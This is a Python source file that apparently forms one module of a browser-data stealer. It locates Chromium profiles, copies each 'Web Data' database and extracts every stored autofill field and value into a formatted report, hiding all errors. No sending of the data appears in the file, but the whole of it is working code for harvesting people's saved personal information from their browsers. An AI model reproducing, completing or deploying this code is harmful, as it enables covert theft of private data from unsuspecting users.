import os
import tempfile
import shutil
import sqlite3
from .utils import get_all_browser_profiles, load_json_config, expand_path

def extract_autofill():
    autofill_data = []
    browser_config = load_json_config("browser.json")
    
    for browser in browser_config.get("chromium_browsers", []):
        browser_path = expand_path(browser["path"])
        browser_name = browser["name"]
        
        if not os.path.exists(browser_path):
            continue
            
        profiles = get_all_browser_profiles(browser_path)
        for profile in profiles:
            web_data = os.path.join(browser_path, profile, "Web Data")
            if not os.path.exists(web_data):
                continue
                
            temp_db = os.path.join(tempfile.gettempdir(), f"Autofill_{browser_name}_{profile}_{os.getpid()}.db")
            try:
                shutil.copy2(web_data, temp_db)
                conn = sqlite3.connect(temp_db, timeout=5)
                cursor = conn.cursor()
                
                # Chromium autofill table
                cursor.execute("SELECT name, value FROM autofill")
                for row in cursor.fetchall():
                    name, value = row
                    if name and value:
                        autofill_data.append({
                            "browser": browser_name,
                            "profile": profile,
                            "field": name,
                            "value": value
                        })
                
                cursor.close()
                conn.close()
            except:
                pass
            finally:
                if os.path.exists(temp_db):
                    try: os.remove(temp_db)
                    except: pass
    return autofill_data

def get_autofill_report():
    data = extract_autofill()
    if not data:
        return None
        
    report = "╔════════════════════════════════════════╗\n"
    report += "║           BROWSER AUTO-FILL            ║\n"
    report += "╠════════════════════════════════════════╣\n"
    for item in data[:50]:
        report += f"║ {str(item['field'])[:15].ljust(15)}: {str(item['value'])[:20].ljust(20)} ║\n"
    if len(data) > 50:
        report += f"║ ... and {len(data)-50} more items.           ║\n"
    report += "╚════════════════════════════════════════╝"
    return report
